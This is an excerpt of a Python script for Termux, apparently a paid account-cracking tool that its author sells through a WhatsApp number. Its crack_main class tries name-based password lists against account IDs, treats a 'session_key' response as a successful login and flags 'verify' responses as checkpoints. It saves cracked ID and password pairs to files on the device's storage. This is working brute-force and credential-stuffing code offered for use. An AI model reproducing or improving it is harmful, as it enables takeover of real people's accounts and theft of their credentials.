...
"""
{50*"-"}
    Tool Version :     10.0.96
    Thanks Alot  :     YASIR-afD
    Connect      :   +923189141630
...
def qsbuy():
	try:
		...
		try:
			...
			print(50*"-")
			print(f" 15-Days Price : 200")
			print(f" 1-Month Price : 350")
			print(50*"-")
			input("[Press Enter To Send Key To Admin]")
			os.system(f"termux-open-url https://wa.me/+923189141630?text={bumper}")
			qsbuy()
...
class crack_main():
	...
	def m1(self,iid,name,passlist):
		try:
			...
			sys.stdout.write('\r[AFRIDI] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
			fn = name.split(' ')[0]
			try:
				ln = name.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				if 'session_key' in po:
					print(' \033[1;32m[AFRIDI-OK] '+roid+' | '+pas+'\033[0;97m')
					open('/sdcard/yasir_ok.txt','a').write(roid+'|'+pas+'\n')
					ok.append(iid)
					break
				...
				if 'User must verify their account' in po:
					try:
						print(' \033[1;31m[AFRIDI-CP] '+roid+' | '+pas+'\033[0;97m')
						open('/sdcard/yasir_cp.txt','a').write(roid+'|'+pas+'\n')
						break
					except Exception as e:
						pass
				else:
	...
	def pasw(self):
		...
		print(' Ok Ids Save In : /sdcard/yasir_ok.txt')
		print(50*'-')
		input('\n Press enter to back ')
		main()
